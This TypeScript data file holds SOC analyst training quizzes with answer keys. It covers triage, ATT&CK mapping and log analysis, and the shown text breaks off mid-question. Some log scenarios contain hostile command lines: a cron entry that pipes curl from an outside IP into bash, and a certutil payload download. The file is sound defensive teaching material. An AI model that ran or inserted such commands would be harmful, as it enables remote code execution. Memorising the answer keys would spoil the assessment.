export interface QuizQuestion {
  id: string;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
  /** Optional scenario block rendered as monospace context above the question (logs, alerts, PCAP, etc.). */
  scenario?: string;
  /** Optional tags shown as small chips (e.g. MITRE tactic, tool, difficulty). */
  tags?: string[];
  /** Optional difficulty for filtering/balance. */
  difficulty?: "easy" | "medium" | "hard";
}

export interface QuizData {
  quizId: string;
  courseId: string;
  title: string;
  description: string;
  questions: QuizQuestion[];
  passingScore: number;
  timeLimit?: number; // in minutes
}

export const quizzes: QuizData[] = [
  {
    quizId: "q1",
    courseId: "soc-fundamentals",
    title: "SOC Operations: Triage & Decision Making",
    description: "Scenario-driven assessment covering SOC roles, escalation logic, metrics, and shift-handover decisions a Tier 1 analyst faces daily.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q1-1",
        difficulty: "easy",
        tags: ["SOC Roles", "Escalation"],
        scenario: "07:42 — You are the only Tier 1 analyst on shift. The SIEM fires three alerts within 30 seconds:\n  1) Brute-force lockout on a service account (low confidence)\n  2) EDR: suspicious child process spawned by winword.exe on FIN-HR-04\n  3) Failed login from a corporate VPN IP for the CFO\nA Tier 2 responder is online; the SOC Manager is in a meeting.",
        question: "Which alert should you triage FIRST, and what is the correct first action?",
        options: [
          "Alert 2 — isolate FIN-HR-04 via EDR and investigate the parent/child chain.",
          "Alert 1 — reset the service account password immediately to stop brute force.",
          "Alert 3 — contact the CFO immediately to verify the corporate VPN login status.",
          "Process all alerts chronologically to maintain strict queue triage discipline."
        ],
        correctAnswer: 0,
        explanation: "Alert 2 has the highest potential impact: an Office process spawning a suspicious child is a classic macro/maldoc execution pattern (T1566.001 → T1059). Containment via EDR isolation buys time without destroying evidence. Alert 1 looks like a misconfigured service, Alert 3 is a single failed login. Resetting the service password (B) destroys context; calling the CFO first (C) wastes minutes during a possible active intrusion; FIFO triage (D) ignores severity — the cardinal sin of Tier 1."
      },
      {
        id: "q1-2",
        difficulty: "medium",
        tags: ["Metrics", "MTTD", "MTTR"],
        scenario: "Monthly SOC report:\n  • Avg time from log ingestion → alert fired: 4 min\n  • Avg time from alert fired → analyst acknowledges: 38 min\n  • Avg time from acknowledgement → containment: 22 min\n  • Avg time from containment → full recovery: 6 hours",
        question: "Which metric is the SOC's biggest weakness, and which control most directly improves it?",
        options: [
          "MTTD — invest in more detection rules and external threat intelligence feeds.",
          "MTTA — review staffing levels, alert routing rules, and on-call rotations.",
          "MTTR — acquire a faster endpoint detection agent with automatic containment.",
          "Recovery time — implement faster server backup and restoration procedures."
        ],
        correctAnswer: 1,
        explanation: "Detection only took 4 minutes, but alerts sat unacknowledged for 38 minutes — that is a Mean Time To Acknowledge (MTTA) problem, almost always rooted in coverage gaps, noisy queues, or poor paging. Adding more rules (A) makes MTTA worse. Faster EDR (C) helps containment, not acknowledgement. Backups (D) address an entirely different phase."
      },
      {
        id: "q1-3",
        difficulty: "medium",
        tags: ["Tiering", "Handover"],
        scenario: "You (T1) have spent 35 minutes on an alert: a user reportedly clicked a phishing link and entered credentials. You confirmed the URL is malicious (VT 12/90), pulled mail headers, and disabled the account. The user mentions \"a weird popup asked me to run a PowerShell command — I did.\"",
        question: "What is the correct next step?",
        options: [
          "Close the case immediately as contained since the account is disabled and the phishing URL is blocked.",
          "Reset the user's password and perform a full workstation reimage yourself to save time and resource.",
          "Escalate to Tier 2 with written handover of indicators, timeline, actions taken, and PowerShell details.",
          "Email the user asking exactly what command they ran on the endpoint, then wait for their response."
        ],
        correctAnswer: 2,
        explanation: "The phishing case has just expanded into possible host compromise (T1059.001 PowerShell). Tier 1 stops at suspected endpoint execution and hands off — but only with a structured handover so Tier 2 doesn't restart the investigation. Closing (A) is negligent; performing reimage yourself (B) breaks tiering and forensic chain of custody; waiting on the user (D) lets the attacker progress."
      },
      {
        id: "q1-4",
        difficulty: "easy",
        tags: ["SOC Models"],
        scenario: "A 400-person fintech runs business hours 09:00–18:00 IST. Compliance requires 24×7 monitoring, but the security budget supports only 3 internal analysts.",
        question: "Which SOC model best fits these constraints?",
        options: [
          "In-house 24×7 SOC — hire five more analysts to cover all night and weekend shifts.",
          "Fully outsourced MSSP — terminate internal team and send all alerts to provider.",
          "Virtual SOC with no dedicated staff — rely on SOAR playbooks and automation only.",
          "Hybrid SOC — internal team covers business hours; MSSP covers nights and weekends."
        ],
        correctAnswer: 3,
        explanation: "Hybrid is the standard fit for mid-size orgs needing 24×7 coverage without the headcount for it. Internal staff retain context and tuning ownership; the MSSP provides eyes-on-glass after hours. (A) blows the budget; (B) loses institutional knowledge; (C) ignores that automation alone cannot triage novel incidents."
      },
      {
        id: "q1-5",
        difficulty: "medium",
        tags: ["SIEM", "Alert Quality"],
        scenario: "Your SIEM rule \"Multiple Failed Logons\" fires 1,200 times/day. Investigation shows ~95% are from a vulnerability scanner and 4% from a misconfigured monitoring agent. Real incidents account for <1%.",
        question: "What is the BEST response?",
        options: [
          "Tune the rule: exclude known scanner/agent source IPs and accounts, then lower the threshold for remaining traffic.",
          "Delete the noisy detection rule completely from the SIEM because the signal is too noisy to be operationally useful.",
          "Add a second Tier 1 analyst to the shift queue so that all 1,200 generated alerts get manually reviewed daily.",
          "Increase the alert threshold from 5 failures to 500 failures so the rule only triggers in extreme circumstances."
        ],
        correctAnswer: 0,
        explanation: "Allow-list known benign sources so the remaining signal is investigable — this preserves the detection while killing the noise. Deleting (B) loses a valid detection. Throwing analysts at noise (C) is the textbook cause of SOC burnout. Crudely raising the threshold (D) makes real brute-force attempts invisible."
      },
      {
        id: "q1-6",
        difficulty: "hard",
        tags: ["Severity", "Business Context"],
        scenario: "Two alerts at the same time:\n  A) Ransomware-style mass file rename on a developer's laptop (offline backups exist; user is on PTO).\n  B) Unusual outbound TLS to a newly-registered domain from the payment-processing server (handles live card transactions).",
        question: "Which incident is HIGHER severity for the business, and why?",
        options: [
          "Alert A — ransomware on a developer laptop is always a P1 priority because file encryption is irreversible without restoring from corporate backups.",
          "Alert B — payment server beaconing to a new domain risks PCI scope, regulatory fines, and data exfiltration even if the active dwell time is short.",
          "Alert A — Ransomware execution must be handled first because it has an immediate visual impact and represents an active threat to system integrity.",
          "Both alerts are equal; severity should be determined solely by the SIEM detection rule's confidence score and default priority level in the queue."
        ],
        correctAnswer: 1,
        explanation: "Severity is impact × likelihood in business context, not the scariness of the alert name. Ransomware on a single offline-backed laptop with no active user is recoverable. A payment server contacting a newly-registered domain is a textbook C2/exfil pattern against a PCI-scoped asset — potential cardholder data loss and regulatory fines. (A)/(B) over-weight the malware label; (D) ignores asset criticality entirely."
      },
      {
        id: "q1-7",
        difficulty: "medium",
        tags: ["Playbooks", "Process"],
        scenario: "Your SOC has no playbook for \"suspected insider data theft.\" An alert fires: a departing employee downloaded 8 GB from SharePoint to a personal device 2 hours ago.",
        question: "What is the appropriate Tier 1 response?",
        options: [
          "Take no action at all — without an approved playbook for insider threat, Tier 1 analysts do not have the authority to initiate any investigation.",
          "Improvise containment: disable the user's Active Directory account, wipe the personal device remotely, and send an email notification to HR department.",
          "Follow the closest playbook, document all deviations, and immediately notify the SOC lead and HR/Legal to handle employee privacy and evidence rules.",
          "Open a low-severity tracking ticket in the system and wait for a formal insider threat playbook to be written and approved by the management team."
        ],
        correctAnswer: 2,
        explanation: "Real SOCs never have a playbook for every scenario. Use the closest playbook as a scaffold, document deviations for post-incident review, and pull in HR/Legal early because insider cases have employment-law and evidence implications. (A) and (D) are negligent; (B) skips legal — wiping a personal device or unilaterally acting on a departing employee can create liability."
      },
      {
        id: "q1-8",
        difficulty: "hard",
        tags: ["False Positive vs True Positive"],
        scenario: "EDR alert: \"Credential dumping behavior on DC01\" — LSASS access by procdump.exe.\nFurther context: the change ticket CHG-4471 shows the AD team scheduled a memory capture for performance troubleshooting in this exact window. The user account matches a domain admin on the ticket.",
        question: "How do you classify and close this alert?",
        options: [
          "True Positive — any LSASS access represents credential dumping behavior; you must immediately isolate the affected DC01 controller and initiate the incident response protocol.",
          "False Positive — immediately close the alert with no notes or documentation since the approved active change ticket explains the administrative behavior on the server.",
          "Unknown behavior — escalate the alert to Tier 3 threat hunters because LSASS access is too high risk for a Tier 1 analyst to judge or document without senior assistance.",
          "Benign True Positive — the behavior occurred and is suspicious, but is authorized; document the change ticket, verify the user, and tune suppression for the approved window."
        ],
        correctAnswer: 3,
        explanation: "This is the classic Benign True Positive (BTP). The detection worked correctly — the activity matches credential dumping — but it is authorized. Closing as plain FP (B) destroys the audit trail and lets a real attacker hide behind future \"change windows.\" Always: verify the ticket, verify the user identity, document, and add a time-boxed tuning suppression. (A) ignores context; (C) escalates unnecessarily."
      },
      {
        id: "q1-9",
        difficulty: "medium",
        tags: ["Logging", "Visibility"],
        scenario: "During an investigation you need to know which process opened a specific outbound TCP connection on a Windows host 3 days ago. The host forwards: Security log, Application log, System log. EDR retention is 24 hours.",
        question: "What is the MOST likely outcome and the correct lesson learned?",
        options: [
          "You cannot recover this data; this is a telemetry gap due to missing Sysmon Event ID 3 and short EDR retention. You should recommend deploying Sysmon and extending EDR retention.",
          "The default Windows Security log will show the process name — Windows logs all process-to-network mapping events by default without any third-party tools or configuration.",
          "Pull the perimeter firewall log — network firewalls inspect all packets and always record the exact originating process name and parent path for every outbound TCP connection.",
          "Reconstruct the timeline from internal DNS resolver logs — DNS queries and responses always include the name of the local process that initiated the original socket request."
        ],
        correctAnswer: 0,
        explanation: "Out-of-the-box Windows does NOT log process→network mapping. Sysmon Event ID 3 is the standard control; without it, and with only 24h EDR retention, the data is gone. Firewall logs (C) see source IP/port, not process name. DNS responses (D) carry no process attribution. Recognizing telemetry gaps is a core SOC competency — the lesson is more important than the failed lookup."
      },
      {
        id: "q1-10",
        difficulty: "hard",
        tags: ["Communication", "Stakeholders"],
        scenario: "You are 90 minutes into an active incident. The CEO walks into the SOC and asks: \"Are we breached? Should I call the board?\"",
        question: "What is the correct response?",
        options: [
          "\"Yes, we are breached — call the board immediately.\" — provide a decisive and quick answer to show that the SOC is on top of the situation and taking charge.",
          "\"We have confirmed intrusion on two endpoints. Scope is being determined; no exfil evidence yet. Next update in 30m. Incident Commander drives board alerts.\" — facts and routing.",
          "\"No, everything is completely under control.\" — reassure the CEO to prevent leadership panic and protect the company from premature disclosure actions.",
          "\"I cannot comment on active investigations, please email the SOC manager.\" — follow strict communication guidelines to avoid releasing unauthorized details."
        ],
        correctAnswer: 1,
        explanation: "Executives need three things: what is known, what is unknown, and when the next update is coming. Overstating (A) triggers premature regulatory disclosures; understating (C) destroys trust if proven wrong; refusing to communicate (D) drives executives to make decisions without you. Always route formal notifications through the Incident Commander to preserve a single source of truth."
      },
      {
        id: "q1-11",
        difficulty: "medium",
        tags: ["Shift Handover"],
        scenario: "End of your night shift. Open items:\n  • INC-204: ongoing phishing investigation, awaiting email gateway logs (ETA 09:00)\n  • INC-208: contained ransomware on one host, eradication pending\n  • 14 alerts in the triage queue, oldest is 11 minutes old",
        question: "Which handover entry is BEST for INC-208?",
        options: [
          "\"INC-208 — ransomware host, handled.\" — keep the entry short and concise to save reading time for the incoming day shift analysts during handover.",
          "\"INC-208 — see the ticketing system for details.\" — instruct the day shift to read the incident log directly to avoid copying information during handover.",
          "\"INC-208 — host LAPTOP-22 isolated via EDR. Account disabled. Eradication pending assignment to endpoint team. No lateral movement. Day shift: confirm reimage.\"",
          "\"INC-208 — ransomware incident is active. Day shift please take over immediately as we are at the end of our shift.\" — route task directly without detail."
        ],
        correctAnswer: 2,
        explanation: "A good handover is self-contained: what happened, what is done, what is pending, who owns it, and what the next shift must do. Vague entries (A/B/D) force the next analyst to restart the investigation — exactly the failure mode SOC handovers exist to prevent."
      },
      {
        id: "q1-12",
        difficulty: "hard",
        tags: ["Threat Intel", "Pyramid of Pain"],
        scenario: "A threat-intel partner shares three indicators tied to APT-X:\n  1) IP address 45.142.x.x (C2 server, observed last week)\n  2) SHA-256 of a custom loader DLL\n  3) TTP: scheduled task named \"OneDriveSync\" calling rundll32 with a .log extension",
        question: "Per the Pyramid of Pain, which indicator gives you the MOST durable detection value, and what should you do with it?",
        options: [
          "The IP — block it at the firewall perimeter; attackers rarely change their command and control infrastructure IPs due to setup and registration costs.",
          "The file hash — add it to the global EDR blocklist; malware hashes represent a unique identifier that never changes across different target systems.",
          "All three are equally durable; you should ingest them as-is directly into the SIEM threat intelligence feed for automatic matching on network logs.",
          "The TTP — write a behavioral detection rule; attackers can easily rotate IPs and recompile binaries but changing their tradecraft is very expensive."
        ],
        correctAnswer: 3,
        explanation: "David Bianco's Pyramid of Pain ranks indicators by how painful they are for the adversary to change. Hashes and IPs are trivially rotated; TTPs require re-tooling. The IP and hash still go into the SIEM/EDR (low cost, short-term win), but the high-value, long-lived detection is the behavioral one. (A)/(B) understate adversary agility; (C) misses the entire point of the model."
      }
    ]
  },
  {
    quizId: "q2",
    courseId: "soc-fundamentals",
    title: "Threat Landscape & Adversary Analysis",
    description: "Scenario-driven assessment on attribution, TTPs, MITRE ATT&CK mapping, and threat-actor decision making for Tier 1/2 analysts.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q2-1",
        difficulty: "medium",
        tags: ["Attribution", "APT", "TTPs"],
        scenario: "Your CTI team shares the following observations from a recent intrusion at a defense contractor:\n- Initial access: spear-phish (DOCX with macro) to a single engineering lead\n- C2: HTTPS beacon to a Cloudflare-fronted domain, 8h jitter, low-and-slow\n- Tooling: custom .NET loader, Cobalt Strike beacon, Mimikatz variant compiled in 2025\n- Dwell time before exfil: 47 days\n- Targeted data: CAD files and contract bids only",
        question: "Based on these observations, which actor class is the BEST fit and why?",
        options: [
          "Nation-state / APT — patient dwell time, narrow target selection, custom tooling, and intellectual-property focus.",
          "Script kiddie — Cobalt Strike is freely available on GitHub and the spear-phishing macro lure is highly generic.",
          "Hacktivist — defense contractors are common political targets for hacktivist groups seeking to make a statement.",
          "Financially motivated cybercrime — Mimikatz usage indicates credential theft for direct resale on dark web forums."
        ],
        correctAnswer: 0,
        explanation: "Long dwell time, surgical targeting (one engineer, one data type), bespoke loader, and theft of competitive IP — not credentials or money — are textbook APT indicators. Cobalt Strike + Mimikatz are commodity tools but the operational discipline (jitter, fronting, narrow scope) shows tradecraft beyond crimeware."
      },
      {
        id: "q2-2",
        difficulty: "medium",
        tags: ["MITRE ATT&CK", "Mapping"],
        scenario: "An analyst observes:\n  parent: outlook.exe -> child: winword.exe -> child: powershell.exe -hidden -enc <base64>\nNetwork: powershell.exe -> 185.x.x.x:443 (rare destination)",
        question: "Which ATT&CK technique chain BEST describes this behavior?",
        options: [
          "T1078 Valid Accounts -> T1021 Remote Services -> T1059.001 PowerShell -> T1486 Data Encrypted for Impact.",
          "T1566.001 Spearphishing Attachment -> T1204.002 User Execution -> T1059.001 PowerShell -> T1071.001 Web Protocols C2.",
          "T1190 Exploit Public-Facing Application -> T1505.003 Web Shell -> T1059.001 PowerShell -> T1071.001 Web Protocols C2.",
          "T1110 Brute Force -> T1078 Valid Accounts -> T1059.001 PowerShell -> T1003.001 OS Credential Dumping LSASS."
        ],
        correctAnswer: 1,
        explanation: "Outlook spawning Word spawning encoded PowerShell that beacons out is the canonical phishing-attachment chain: delivery (T1566.001), user opens it (T1204.002), macro launches PowerShell (T1059.001), and C2 over HTTPS (T1071.001). Mapping observed telemetry to the exact ATT&CK IDs is a core Tier 1/2 skill."
      },
      {
        id: "q2-3",
        difficulty: "hard",
        tags: ["BEC", "Triage"],
        scenario: "At 09:14, the CFO forwards an email she 'thinks is suspicious.' The message is from cfo@yourcompany.co (note .co) and asks the AP clerk to push a $480k wire to a new vendor before EOD. Mail logs show the message was sent from 198.51.100.22 (Lithuania), SPF=fail, DMARC=quarantine but the gateway delivered it because the AP clerk's mailbox has an allow-list rule for 'cfo@yourcompany.*'.",
        question: "What is the MOST important immediate action?",
        options: [
          "Block the sender source IP address at the perimeter firewall immediately, then close the ticket as contained to clear queue.",
          "Reply-all to the email thread warning all internal corporate users not to click or interact with the malicious message.",
          "Confirm with AP that no wire has been initiated, remove the over-broad allow-list rule, and recall the message tenant-wide.",
          "Submit the malicious sender domain to VirusTotal, check the reputation database, and wait for community votes to update."
        ],
        correctAnswer: 2,
        explanation: "BEC triage priority: (1) stop financial loss — verify no wire is in-flight, (2) eliminate the control gap that bypassed SPF/DMARC (the wildcard allow-list), (3) purge the message from all mailboxes. Firewall IP blocks are nearly useless for email; the cheap fix is fixing the mail rule and recalling the message."
      },
      {
        id: "q2-4",
        difficulty: "medium",
        tags: ["Supply Chain", "Risk"],
        scenario: "Your vulnerability feed reports that a popular JS package your e-commerce site loads via CDN had a malicious version published last night that exfiltrates form data. Your site pins '^1.2.0' and rebuilds nightly.",
        question: "Which response is correct AND properly scoped?",
        options: [
          "Take no action at all — CDN providers will automatically handle the compromise and rollback the package on their side.",
          "Disable the entire e-commerce site immediately until the NPM package author replies to your security team request.",
          "Block the external CDN domain at the perimeter firewall to prevent any script execution on customer browsers.",
          "Pin to last known-good version, redeploy, and implement CSP and SRI policies to prevent unauthorized script tampering."
        ],
        correctAnswer: 3,
        explanation: "Caret-range pinning (`^1.2.0`) auto-upgrades and is the actual root cause. Pin exact, redeploy, and add Subresource Integrity (SRI) + Content-Security-Policy so a future tampered script can't execute. This is the SolarWinds / event-stream class lesson."
      },
      {
        id: "q2-5",
        difficulty: "hard",
        tags: ["Insider Threat", "Behavioral"],
        scenario: "A senior developer in his notice period:\n- Logged in at 02:30 on a Sunday (first time ever off-hours)\n- Cloned 14 private repos to a personal laptop via GitHub PAT\n- Sent 6 GB to a personal Google Drive 12 minutes later\n- Has legitimate access to every repo touched",
        question: "How should you classify this and what is the right first action?",
        options: [
          "True positive insider threat — preserve evidence, revoke PAT and SSO sessions, and engage HR/Legal before confronting the user.",
          "False positive event — the developer has legitimate access to all repositories, so this activity is not a policy violation.",
          "Active malware infection — initiate the incident response protocol immediately and perform a full reimage of his workstation.",
          "Benign administrative activity — wait until the user returns on Monday morning to ask him about the bulk repository clones."
        ],
        correctAnswer: 0,
        explanation: "Authorized access does not equal authorized use. The off-hours pattern + bulk clone + immediate cloud upload + notice-period context is classic intentional exfiltration. The procedural order matters: evidence first, contain identity, loop HR/legal — never tip off the subject."
      },
      {
        id: "q2-6",
        difficulty: "medium",
        tags: ["Credential Attacks"],
        scenario: "Azure AD sign-in logs over 1 hour:\n- 14,200 failed logins\n- Across 9,800 distinct usernames\n- Same 3 passwords tried: 'Winter2026!', 'Company@123', 'Welcome1'\n- Source: 4 residential proxy ASNs",
        question: "This is BEST described as which attack, and which control most directly mitigates it?",
        options: [
          "Brute force on one account — configure account lockout thresholds on Active Directory.",
          "Password spraying — enable MFA, risk-based conditional access, and ban common passwords.",
          "Credential stuffing — enable MFA and implement compromised password database screening.",
          "Phishing attack — deploy external email banner warnings and schedule security training."
        ],
        correctAnswer: 1,
        explanation: "Few passwords across many accounts = spraying (designed to stay below per-account lockout). Stuffing would use leaked username:password pairs (1:1). MFA + conditional access on impossible travel/unfamiliar location + banned-password lists are the mitigations the framework explicitly recommends."
      },
      {
        id: "q2-7",
        difficulty: "hard",
        tags: ["Pyramid of Pain", "CTI"],
        scenario: "After containing an intrusion, you have these artifacts:\n  A) MD5 of dropper: 5d41402abc4b2a76b9719d911017c592\n  B) C2 IP: 203.0.113.45\n  C) C2 domain: secure-update[.]net\n  D) Tool: 'Cobalt Strike Malleable C2 profile mimicking Office365 traffic'\n  E) TTP: 'phishing -> macro -> PowerShell -> CS beacon over HTTPS jitter 30%'",
        question: "Which artifact would cause the MOST 'pain' to the adversary if you block/detect on it, per the Pyramid of Pain?",
        options: [
          "Artifact A (dropper hash) — file hashes represent the most unique indicator that is extremely easy to block globally via EDR.",
          "Artifact B (C2 IP) — IP addresses represent physical server infrastructure that is relatively difficult for an actor to rotate.",
          "Artifact E (TTP) — behavioral tradecraft is at the top of the pyramid; changing techniques is far harder than rotating IPs.",
          "Artifact C (C2 domain) — domains require DNS registration and reputation aging, making them very painful to replace quickly."
        ],
        correctAnswer: 2,
        explanation: "Bianco's Pyramid of Pain: hashes/IPs/domains are trivial-to-easy to rotate; tools annoying; TTPs are 'tough!' because they force the adversary to rebuild tradecraft. Tier 2/3 detection engineering should prioritize behavioral signatures over IOCs."
      }
    ]
  },
  {
    quizId: "q3",
    courseId: "soc-fundamentals",
    title: "Log Analysis & Triage Challenge",
    description: "Hands-on triage using real Windows, Linux, and proxy/firewall log excerpts.",
    passingScore: 75,
    timeLimit: 30,
    questions: [
      {
        id: "q3-1",
        difficulty: "medium",
        tags: ["Windows", "EventID 4625", "Brute Force"],
        scenario: "Security.evtx excerpt:\n  04:12:01  4625  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21  Status=0xC000006A\n  04:12:03  4625  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21  Status=0xC000006A\n  ... (192 entries over 6 minutes, same source, same account)\n  04:18:11  4624  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21",
        question: "What occurred?",
        options: [
          "Successful brute force / password guess against svc_backup service account from an internal host.",
          "Service restart loop — a misconfigured backup service restarting repeatedly is benign activity.",
          "Kerberos ticket expiration — the service account failed to renew its ticket within the active window.",
          "Logon type 3 network connections cannot represent brute force attempts and should be safely ignored."
        ],
        correctAnswer: 0,
        explanation: "Status 0xC000006A = wrong password. 192 failures from one source against one account followed by a 4624 success is unambiguous credential guessing — and the source is INTERNAL (10.0.5.21), suggesting lateral movement or a compromised host. Service accounts are juicy because they often have stale passwords and broad rights."
      },
      {
        id: "q3-2",
        difficulty: "hard",
        tags: ["Linux", "auth.log", "Persistence"],
        scenario: "/var/log/auth.log:\n  Mar 14 23:01 sshd[2210]: Accepted publickey for root from 198.51.100.7 port 51220\n  Mar 14 23:01 sudo: root : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/crontab -e\n  Mar 14 23:02 systemd: Started Session 88 of user root.\nAnd `crontab -l` now shows:\n  */5 * * * * curl -s http://198.51.100.7/u | bash",
        question: "What is the correct classification and immediate containment?",
        options: [
          "Routine administrative work — root user logged in legitimately to perform system troubleshooting, and configured an automated monitoring script via crontab.",
          "Confirmed compromise + persistence: rogue cron pulling a shell. Isolate host, capture memory, remove cron, rotate keys, and hunt the attacker IP fleet-wide.",
          "Misconfigured monitoring agent — an internal utility is generating noise by polling an external update site, we should silence this alert going forward.",
          "Phishing campaign — notify internal users to watch out for suspicious emails asking them to execute system administration commands or upload ssh keys."
        ],
        correctAnswer: 1,
        explanation: "Direct root SSH from an external IP + immediate cron persistence beaconing to that same IP is textbook initial-access + T1053.003 (Cron) persistence. Containment must preserve evidence (memory + auth.log + cron) before remediation, and the hunt step (same key / IP across other hosts) is what separates a real responder from someone who just deletes the cron."
      },
      {
        id: "q3-3",
        difficulty: "medium",
        tags: ["Proxy", "Beaconing"],
        scenario: "Squid access.log — same client, 24h:\n  Requests to https://cdn-metrics[.]xyz/collect: 288\n  Mean interval: 300s, std-dev: 4s\n  Bytes out per request: ~1.2 KB, bytes in: 96 B",
        question: "What pattern is this and what is the correct next step?",
        options: [
          "Normal website analytics traffic — this represents standard telemetry updates to a CDN and the tracking ticket can be closed safely without further actions.",
          "DDoS attack traffic — the host is trying to overwhelm an external service using high-frequency requests, we must immediately block the target IP at firewall.",
          "C2 beaconing — low jitter, periodic small payloads; we must pivot on destination across all hosts, check domain age, and identify the initiating local process.",
          "Software update check — a local application is checking for available patches at a periodic interval and the connection attempts can be ignored by analysts."
        ],
        correctAnswer: 2,
        explanation: "Tight periodicity (300s ± 4s) with asymmetric small payloads is the signature of automated beaconing, not human or analytics traffic. The pivot pattern (other clients hitting the same destination, domain WHOIS age, process attribution via EDR) is the standard hunt loop."
      },
      {
        id: "q3-4",
        difficulty: "hard",
        tags: ["Windows", "Sysmon", "LOLBin"],
        scenario: "Sysmon Event ID 1:\n  Image: C:\\Windows\\System32\\certutil.exe\n  CommandLine: certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  User: CORP\\jdoe",
        question: "What is happening?",
        options: [
          "Routine certificate validation — certutil is verifying the local root certificate store and checking CRL distribution points over standard HTTP ports.",
          "Windows Update activity — system process cmd.exe has launched certutil to download package updates from Microsoft CDN servers during a scheduled window.",
          "Antivirus signature refresh — endpoint security agent is using certutil command line switches to retrieve updated definition files from signature server.",
          "LOLBin download (T1105) — certutil is used to download an external file; investigate the parent cmd.exe process origin and isolate the dropped p.exe file."
        ],
        correctAnswer: 3,
        explanation: "certutil with -urlcache -split -f is a well-known LOLBin pattern to fetch a remote payload while bypassing some egress monitoring. Map to T1105 + T1218 abuse. Pivot to discover what spawned cmd.exe — that's often the real entry point."
      },
      {
        id: "q3-5",
        difficulty: "medium",
        tags: ["Firewall", "Data Exfil"],
        scenario: "Palo Alto traffic log, single internal workstation, last hour:\n  app=dns  dst=8.8.8.8  bytes_out=412,000,000  sessions=14,902  avg_query_len=180\n  app=web-browsing dst=mixed bytes_out=2,100,000",
        question: "What is the likely activity?",
        options: [
          "DNS tunneling / exfiltration over port 53 — large query volume with long subdomain names; isolate the host and capture a network packet dump.",
          "Heavy web browsing — the user is visiting dynamic websites that load resources from many CDNs, leading to high-volume DNS lookup requests.",
          "DNS cache poisoning attempt — an external server is trying to inject malicious records into the internal DNS server cache to redirect traffic.",
          "Normal operating system patching activity — automated update agent is querying domain records to locate nearby file distribution servers."
        ],
        correctAnswer: 0,
        explanation: "412 MB of outbound DNS in an hour with 180-byte average query length is far outside normal. DNS is rarely inspected and frequently allowed outbound — making it the favorite covert channel. The correct response is host isolation + packet capture for forensics, plus a DNS-volume detection going forward."
      },
      {
        id: "q3-6",
        difficulty: "hard",
        tags: ["Correlation"],
        scenario: "Three alerts within 14 minutes from the SAME endpoint (HOST-44):\n  A) EDR: suspicious WMI subscription created\n  B) AD: HOST-44$ enumerated all Domain Admins via LDAP\n  C) Firewall: SMB (445/tcp) to 23 other internal hosts that HOST-44 has never talked to before",
        question: "What is the BEST interpretation?",
        options: [
          "Three unrelated low-severity events — these occurred independently and do not represent a coordinated threat, close as separate benign findings.",
          "Active intrusion — WMI persistence, LDAP discovery, and SMB lateral sweep; escalate to incident response team and isolate host HOST-44 immediately.",
          "Vulnerability scanner activity — an authorized internal scanner is performing a scheduled audit of local workstations and active active directory hosts.",
          "System administrator performing inventory — IT staff is executing active directory queries and connecting to remote servers to collect asset details."
        ],
        correctAnswer: 1,
        explanation: "Individually these are 'meh.' Correlated they form Persistence -> Discovery -> Lateral Movement on the kill chain — the unmistakable middle game of a real intrusion. SOC value lives in correlation, not single-alert handling."
      }
    ]
  },
  {
    quizId: "q4",
    courseId: "soc-fundamentals",
    title: "SIEM & Alert Triage in Practice",
    description: "Scenario quiz on writing, tuning, and triaging SIEM detections.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q4-1",
        difficulty: "medium",
        tags: ["Tuning", "False Positives"],
        scenario: "Detection 'Mass File Access' fires 480 times/day. Review shows 96% come from three backup service accounts running nightly snapshots and the SCCM scanner.",
        question: "What is the correct tuning approach?",
        options: [
          "Add precise allow-list (named accounts and time windows), document suppression with expiry/review date, and keep active for other systems.",
          "Disable the detection rule entirely in the SIEM since it generates too many false positives and is not operationally useful for analysts.",
          "Raise the alert severity level to Critical so that analysts prioritize triaging these alerts ahead of other events in the active queue.",
          "Mute all email notifications and ticket creation templates for the specific user mailbox of whoever complained about the alert noise."
        ],
        correctAnswer: 0,
        explanation: "Good tuning suppresses *only* the known-benign context (named accounts + time window), not the entire rule. Always document suppressions with an owner and review date so they don't become permanent blind spots."
      },
      {
        id: "q4-2",
        difficulty: "hard",
        tags: ["Splunk", "SPL"],
        scenario: "You need to detect users authenticating from two different countries within 1 hour ('impossible travel').",
        question: "Which Splunk approach is MOST correct?",
        options: [
          "`index=auth | stats count by user` — returns simple authentication counts per user that the analyst must manually review for geographic anomalies.",
          "`index=auth | bin _time span=1h | iplocation src_ip | stats dc(Country) as countries by user, _time | where countries>1` — bins time before counting.",
          "`index=auth action=success | iplocation src_ip | stats dc(Country) as countries values(Country) as c by user _time | where countries>1` — no time bin.",
          "`index=auth | head 100` — returns the first 100 events in the authentication index to allow the analyst to visually inspect source IP addresses."
        ],
        correctAnswer: 1,
        explanation: "Option B buckets time into 1h windows BEFORE counting distinct countries per user — the correct semantic for 'within 1 hour.' Option C without a time bucket lumps the whole search range and produces noisy true-but-useless positives. Detection engineering requires the query to match the English."
      },
      {
        id: "q4-3",
        difficulty: "medium",
        tags: ["Triage", "Severity"],
        scenario: "Three alerts hit your queue simultaneously at 14:00:\n  1) IDS: Nmap SYN scan from 192.0.2.10 -> 10.0.0.0/24\n  2) EDR: ransomware behavioral block on FIN-DB-01 (production financial DB)\n  3) DLP: 1 customer record copied to USB on HR laptop",
        question: "Correct triage order?",
        options: [
          "Triage order 1, 2, 3 — process alerts chronologically in the exact order they arrived in the queue.",
          "Triage order 3, 1, 2 — prioritize alphabetically by alert name to maintain consistent naming sorting.",
          "Triage order 2, 3, 1 — prioritize by impact: database ransomware first, DLP next, and network recon last.",
          "Triage order based on complexity — process whichever alert has the fewest fields to analyze first."
        ],
        correctAnswer: 2,
        explanation: "Ordering by business impact (and reversibility) is the analyst's primary triage skill. Active ransomware on a financial system is potentially catastrophic and time-critical; recon is informational and can wait. Severity in the queue rarely matches reality — analyst judgement does."
      },
      {
        id: "q4-4",
        difficulty: "hard",
        tags: ["Detection Engineering"],
        scenario: "A new detection 'Encoded PowerShell' fires on:\n  powershell.exe -enc <base64>\nAfter 2 weeks: 1,400 fires, 1,392 from a legitimate SCCM client-action script.",
